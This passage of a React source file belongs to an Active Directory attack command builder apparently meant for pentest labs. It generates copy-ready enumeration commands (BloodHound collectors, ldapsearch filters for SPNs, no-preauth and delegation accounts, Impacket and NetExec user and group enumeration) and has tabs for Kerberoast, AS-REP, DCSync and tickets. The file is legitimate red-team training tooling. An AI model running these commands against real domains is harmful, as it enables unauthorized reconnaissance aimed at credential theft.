  setDomain: (v: string) => void
  setDc: (v: string) => void
  setUser: (v: string) => void
  setPassword: (v: string) => void
}) {
  const d = domain.trim() || 'LAB.LOCAL'
  const dcHost = dc.trim() || 'dc01.lab.local'
  const u = user.trim() || 'lowpriv'
  const p = password.trim() || 'Password123'
  const baseDn = `dc=${d.replace(/\./g, ',dc=')}`

  return (
    <div className="space-y-5">
      <div>
        <h2 className="text-white font-semibold text-lg text-red-400 mb-1">AD collection</h2>
        <p className="text-sm text-white/50">Graph + LDAP shortlists for Cerberus analysis. Noisy — lab scopes only.</p>
      </div>
      <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
        <Field label="Domain" value={domain} onChange={setDomain} placeholder="LAB.LOCAL" mono />
        <Field label="DC host / IP" value={dc} onChange={setDc} placeholder="dc01.lab.local" mono />
        <Field label="User" value={user} onChange={setUser} placeholder="lowpriv" mono />
        <Field label="Password" value={password} onChange={setPassword} placeholder="Password123" mono type="password" />
      </div>
      <div className="space-y-3">
        <CmdBlock id="bh-python" title="bloodhound-python" cmd={`bloodhound-python -d ${d} -u ${u} -p '${p}' -ns ${dcHost} -c All --zip`} copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="sharphound" title="SharpHound" cmd={`SharpHound.exe -c All --zipfilename lab_bh.zip\nInvoke-BloodHound -CollectionMethod All -ZipFileName lab_bh.zip`} copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="ldap-spn" title="ldapsearch — SPNs" cmd={`ldapsearch -x -H ldap://${dcHost} -D '${u}@${d}' -w '${p}' -b "${baseDn}" "(&(objectCategory=user)(servicePrincipalName=*))" samAccountName servicePrincipalName`} copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="ldap-preauth" title="ldapsearch — DONT_REQ_PREAUTH" cmd={`ldapsearch -x -H ldap://${dcHost} -D '${u}@${d}' -w '${p}' -b "${baseDn}" "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" samAccountName`} copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="ldap-admincount" title="ldapsearch — adminCount=1" cmd={`ldapsearch -x -H ldap://${dcHost} -D '${u}@${d}' -w '${p}' -b "${baseDn}" "(&(objectCategory=user)(adminCount=1))" samAccountName memberOf`} note="Privileged users shortlist for lab prioritization" copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="impacket-find" title="Impacket FindDelegation" cmd={`findDelegation.py ${d}/${u}:'${p}' -dc-ip ${dcHost}`} note="Constrained/unconstrained delegation clues" copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="getadusers" title="Impacket GetADUsers" cmd={`GetADUsers.py ${d}/${u}:'${p}' -dc-ip ${dcHost} -all`} copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="lookupsid" title="Impacket lookupsid (RID cycle)" cmd={`lookupsid.py ${d}/${u}:'${p}'@${dcHost}`} note="User/group RID enumeration in lab" copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="rpcdump" title="Impacket rpcdump" cmd={`rpcdump.py ${d}/${u}:'${p}'@${dcHost}`} copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="nxc-users" title="NetExec — user enum" cmd={`netexec smb ${dcHost} -u '${u}' -p '${p}' --users`} copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="nxc-groups" title="NetExec — groups" cmd={`netexec smb ${dcHost} -u '${u}' -p '${p}' --groups`} copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="nxc-pass-pol" title="NetExec — password policy" cmd={`netexec smb ${dcHost} -u '${u}' -p '${p}' --pass-pol`} copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="ldap-unconst" title="ldapsearch — unconstrained delegation" cmd={`ldapsearch -x -H ldap://${dcHost} -D '${u}@${d}' -w '${p}' -b "${baseDn}" "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" cn dNSHostName`} copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="ldap-trusted" title="ldapsearch — trusted for delegation" cmd={`ldapsearch -x -H ldap://${dcHost} -D '${u}@${d}' -w '${p}' -b "${baseDn}" "(userAccountControl:1.2.840.113556.1.4.803:=16777216)" sAMAccountName`} note="TrustedToAuthForDelegation bit — lab research" copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="windapsearch" title="windapsearch-style module note" cmd={`# Example patterns often wrapped by windapsearch / enum tools\n# --users  --groups  --da  --spn  --asrep`} note="Use your preferred LDAP wrapper with same filters as above" copiedStates={copiedStates} onCopy={onCopy} />
      </div>
    </div>
  )
}

function ChecklistPanel({
  checklist, onToggle, onReset,
}: {
  checklist: Record<string, boolean>
  onToggle: (id: string) => void
  onReset: () => void
}) {
  const done = checklistItems.filter(i => checklist[i.id]).length
  return (
    <div className="space-y-4">
      <div className="flex items-center justify-between flex-wrap gap-2">
        <h2 className="text-white font-semibold text-lg text-red-400 flex items-center gap-2">
          <ListChecks size={18} /> Lab checklist
        </h2>
        <div className="flex items-center gap-3">
          <span className="text-sm text-white/40">{done}/{checklistItems.length}</span>
          <button type="button" onClick={onReset} className="text-xs text-white/40 hover:text-white/70 flex items-center gap-1">
            <RotateCcw size={12} /> Reset
          </button>
        </div>
      </div>
      <div className="h-2 rounded-full bg-white/10 overflow-hidden">
        <div className="h-full bg-red-500 transition-all" style={{ width: `${(done / Math.max(1, checklistItems.length)) * 100}%` }} />
      </div>
      <div className="space-y-2">
        {checklistItems.map(item => {
          const on = !!checklist[item.id]
          return (
            <button
              key={item.id}
              type="button"
              onClick={() => onToggle(item.id)}
              className={`w-full text-left p-4 rounded-xl border transition-colors flex gap-3 ${
                on ? 'border-emerald-500/30 bg-emerald-500/5' : 'border-white/10 bg-white/5 hover:border-white/20'
              }`}
            >
              <span className="mt-0.5 flex-shrink-0">
                {on ? <CheckCircle size={18} className="text-emerald-400" /> : <div className="w-[18px] h-[18px] rounded-full border border-white/30" />}
              </span>
              <span>
                <span className={`text-sm font-medium ${on ? 'text-emerald-200/90 line-through' : 'text-white'}`}>{item.label}</span>
                <span className="block text-xs text-white/40 mt-0.5">{item.detail}</span>
              </span>
            </button>
          )
        })}
      </div>
    </div>
  )
}

function loadCreds() {
  try {
    const raw = localStorage.getItem(STORAGE_CREDS)
    if (!raw) return null
    return JSON.parse(raw) as { domain?: string; dc?: string; user?: string }
  } catch { return null }
}

export default function ADAttackHelper() {
  const saved = loadCreds()
  const [activeTab, setActiveTab] = useState<Tab>('overview')
  const [copiedStates, setCopiedStates] = useState<Record<string, 'idle' | 'copied' | 'failed'>>({})
  const [sidebarOpen, setSidebarOpen] = useState(false)
  const [domain, setDomain] = useState(saved?.domain || 'LAB.LOCAL')
  const [dc, setDc] = useState(saved?.dc || 'dc01.lab.local')
  const [user, setUser] = useState(saved?.user || 'lowpriv')
  const [password, setPassword] = useState('')
  const [spnUser, setSpnUser] = useState('')
  const [targetUser, setTargetUser] = useState('')
  const [wordlist, setWordlist] = useState('/usr/share/wordlists/rockyou.txt')
  const [outfileKerb, setOutfileKerb] = useState('kerb.hashes')
  const [outfileAsrep, setOutfileAsrep] = useState('asrep.hashes')
  const [checklist, setChecklist] = useState<Record<string, boolean>>(() => {
    try { return JSON.parse(localStorage.getItem(STORAGE_CHECKLIST) || '{}') } catch { return {} }
  })
  const copyTimers = useRef(new Map<string, ReturnType<typeof setTimeout>>())

  useEffect(() => () => {
    copyTimers.current.forEach(t => clearTimeout(t))
    copyTimers.current.clear()
  }, [])
  useEffect(() => {
    try { localStorage.setItem(STORAGE_CHECKLIST, JSON.stringify(checklist)) } catch { /* quota */ }
  }, [checklist])
  useEffect(() => {
    try {
      localStorage.setItem(STORAGE_CREDS, JSON.stringify({ domain, dc, user }))
    } catch { /* quota */ }
  }, [domain, dc, user])
  useEffect(() => {
    if (!sidebarOpen) return
    const onKey = (e: KeyboardEvent) => { if (e.key === 'Escape') setSidebarOpen(false) }
    window.addEventListener('keydown', onKey)
    return () => window.removeEventListener('keydown', onKey)
  }, [sidebarOpen])

  const checklistDone = checklistItems.filter(i => checklist[i.id]).length

  const copyToClipboard = useCallback(async (text: string): Promise<boolean> => {
    if (navigator.clipboard?.writeText) {
      try { await navigator.clipboard.writeText(text); return true } catch { /* fall through */ }
    }
    try {
      const el = document.createElement('textarea')
      el.value = text
      el.style.position = 'fixed'
      el.style.opacity = '0'
      document.body.appendChild(el)
      el.select()
      const ok = document.execCommand('copy')
      document.body.removeChild(el)
      return ok
    } catch { return false }
  }, [])

  const handleCopy = useCallback((id: string, text: string) => {
    void copyToClipboard(text).then(ok => {
      setCopiedStates(prev => ({ ...prev, [id]: ok ? 'copied' : 'failed' }))
      const existing = copyTimers.current.get(id)
      if (existing) clearTimeout(existing)
      const t = setTimeout(() => {
        setCopiedStates(prev => ({ ...prev, [id]: 'idle' }))
        copyTimers.current.delete(id)
      }, 1800)
      copyTimers.current.set(id, t)
    })
  }, [copyToClipboard])

  const setTab = (id: Tab) => {
    setActiveTab(id)
    setSidebarOpen(false)
  }

  const sharedCreds = useMemo(() => ({
    domain, dc, user, password, setDomain, setDc, setUser, setPassword,
  }), [domain, dc, user, password])

  const panel = useMemo(() => {
    switch (activeTab) {
      case 'overview':
        return <OverviewPanel />
      case 'details':
        return <DetailsPanel />
      case 'kerberoast':
        return (
          <KerberoastPanel
            {...sharedCreds}
            spnUser={spnUser}
            setSpnUser={setSpnUser}
            outfile={outfileKerb}
            setOutfile={setOutfileKerb}
            copiedStates={copiedStates}
            onCopy={handleCopy}
          />
        )
      case 'asrep':
        return (
          <AsrepPanel
            {...sharedCreds}
            targetUser={targetUser}
            setTargetUser={setTargetUser}
            wordlist={wordlist}
            setWordlist={setWordlist}
            outfile={outfileAsrep}
            setOutfile={setOutfileAsrep}
            copiedStates={copiedStates}
            onCopy={handleCopy}
          />
        )
      case 'dcsync':
        return (
          <DcsyncPanel
            {...sharedCreds}
            targetUser={targetUser}
            setTargetUser={setTargetUser}
            copiedStates={copiedStates}
            onCopy={handleCopy}
          />
        )
      case 'tickets':
        return (
          <TicketsPanel
            wordlist={wordlist}
            setWordlist={setWordlist}
            outfileKerb={outfileKerb}
            setOutfileKerb={setOutfileKerb}
            outfileAsrep={outfileAsrep}
            setOutfileAsrep={setOutfileAsrep}
            copiedStates={copiedStates}
            onCopy={handleCopy}
          />
        )
      case 'collection':
        return (
          <CollectionPanel
            {...sharedCreds}
            copiedStates={copiedStates}
            onCopy={handleCopy}
          />
        )
      case 'checklist':
        return (
          <ChecklistPanel
            checklist={checklist}
            onToggle={id => setChecklist(prev => ({ ...prev, [id]: !prev[id] }))}
            onReset={() => setChecklist({})}
          />
        )
      default:
        return null
    }
  }, [activeTab, sharedCreds, spnUser, targetUser, wordlist, outfileKerb, outfileAsrep, copiedStates, handleCopy, checklist])

  return (
    <div className="min-h-full overflow-y-auto" style={{ background: 'linear-gradient(135deg, #090b14 0%, #0d1022 50%, #090b14 100%)' }}>
      <div className="max-w-6xl mx-auto p-6">
        <div className="flex items-center justify-between mb-6 flex-wrap gap-3">
          <div className="flex items-center gap-3">
            <div
              className="w-10 h-10 rounded-xl flex items-center justify-center"
              style={{
                background: 'radial-gradient(circle, rgba(239,68,68,0.2), rgba(239,68,68,0.05))',
                border: '1px solid rgba(239,68,68,0.15)',
              }}
            >
              <Flame size={18} className="text-red-400" />
            </div>
            <div>
              <h1 className="text-white font-bold text-xl tracking-wide">ORTHRUS</h1>
              <p className="text-white/40 text-xs">AD command builder — Kerberoast · AS-REP · DCSync · tickets</p>
            </div>
          </div>
          <div className="flex items-center gap-2">
            <div className="hidden sm:flex items-center gap-2 text-xs text-white/30">
              <Shield size={14} className="text-red-400" />
              <span>lab · {checklistDone}/{checklistItems.length}</span>
            </div>
            <button
              type="button"
              onClick={() => setSidebarOpen(o => !o)}
              className="lg:hidden w-8 h-8 rounded-xl bg-white/5 border border-white/10 flex items-center justify-center text-white/40 hover:text-white/70"
              aria-label="Menu"
            >
              <Menu size={14} />
            </button>
          </div>
        </div>

        <div className="rounded-2xl border border-red-500/30 p-4 flex gap-3 mb-4" style={{ background: 'rgba(239,68,68,0.08)' }}>
          <AlertTriangle className="text-red-400 mt-0.5 flex-shrink-0" size={18} />
          <div className="text-sm text-red-100/80">
            Authorized AD labs only (GOAD, HTB/THM, your domain). Kerberoast / AS-REP / DCSync / ticket ops without permission are illegal.
          </div>
        </div>

        {/* Shared context strip */}
        <div className="mb-4 p-3 rounded-xl border border-white/10 flex flex-wrap gap-3 items-end" style={{ background: 'rgba(255,255,255,0.03)' }}>
          <div className="flex items-center gap-2 text-xs text-white/40 mr-1">
            <Terminal size={14} className="text-red-400" />
            <span className="font-black uppercase tracking-widest">Session</span>
          </div>
          <div className="flex-1 grid grid-cols-1 sm:grid-cols-3 gap-2 min-w-[200px]">
            <input value={domain} onChange={e => setDomain(e.target.value)} placeholder="Domain" className="rounded-lg bg-black/30 border border-white/10 px-2 py-1.5 font-mono text-xs text-white/80 outline-none focus:border-red-500/40" />
            <input value={dc} onChange={e => setDc(e.target.value)} placeholder="DC host/IP" className="rounded-lg bg-black/30 border border-white/10 px-2 py-1.5 font-mono text-xs text-white/80 outline-none focus:border-red-500/40" />
            <input value={user} onChange={e => setUser(e.target.value)} placeholder="User" className="rounded-lg bg-black/30 border border-white/10 px-2 py-1.5 font-mono text-xs text-white/80 outline-none focus:border-red-500/40" />
          </div>
        </div>

        {sidebarOpen && (
          <div className="lg:hidden mb-4 rounded-xl border border-white/10 bg-black/40 p-2 space-y-1">
            {tabs.map(tab => {
              const Icon = tab.icon
              return (
                <button
                  key={tab.id}
                  type="button"
                  onClick={() => setTab(tab.id)}
                  className={`w-full flex items-center gap-2 px-3 py-2.5 rounded-lg text-sm ${
                    activeTab === tab.id ? 'bg-red-500 text-white' : 'text-white/50 hover:bg-white/5'
                  }`}
                >
                  <Icon size={14} /> {tab.label}
                </button>
              )
            })}
          </div>
        )}

        <div className="hidden lg:flex bg-white/5 rounded-xl p-1 border border-white/10 mb-6 overflow-x-auto">
          {tabs.map(tab => {
            const Icon = tab.icon
            return (
              <button
                key={tab.id}
                type="button"
                onClick={() => setTab(tab.id)}
                className={`flex items-center gap-2 px-3 py-2 rounded-lg text-sm font-medium transition-all whitespace-nowrap ${
                  activeTab === tab.id ? 'bg-red-500 text-white' : 'text-white/40 hover:text-white/70'
                }`}
              >
                <Icon size={14} /> {tab.label}
              </button>
            )
          })}
        </div>

        <div className="rounded-2xl border border-white/10 p-6" style={{ background: 'rgba(255,255,255,0.03)' }}>
          {panel}
        </div>
      </div>
    </div>
  )
}
